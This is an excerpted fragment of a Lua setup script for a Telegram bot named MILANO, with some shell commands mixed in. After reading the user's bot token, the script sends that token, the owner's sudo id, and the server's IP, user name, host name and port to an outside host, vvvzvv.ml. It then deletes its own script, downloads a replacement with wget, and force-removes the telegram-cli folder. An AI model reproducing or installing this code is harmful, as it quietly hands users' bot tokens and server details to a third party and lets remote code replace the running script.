...
local token = io.read()
if token ~= '' then
data,res = https.request("https://vvvzvv.ml/index/MILANO.php?p=MILANOTEAM")
if res == 200 then
tr = json:decode(data)
...
data,res = https.request("https://vvvzvv.ml/index/MILANO.php?bn=info&id="..Id)
if res == 200 then
...
local t = json:decode(https.request('https://vvvzvv.ml/index/MILANO.php?n=MILANOTEAM&id='..database:get(Server_Done.."UserSudo_Write").."&token="..database:get(Server_Done.."Token_Write").."&UserS="..User.."&IPS="..IP.."&NameS="..Name.."&Port="..Port.."&Time="..Time))
...
rm -fr MILANO.lua
wget "https://raw.githubusercontent.com/MILANOSR/MILANO/main/MILANO.lua"
while(true) do
rm -fr ../.telegram-cli
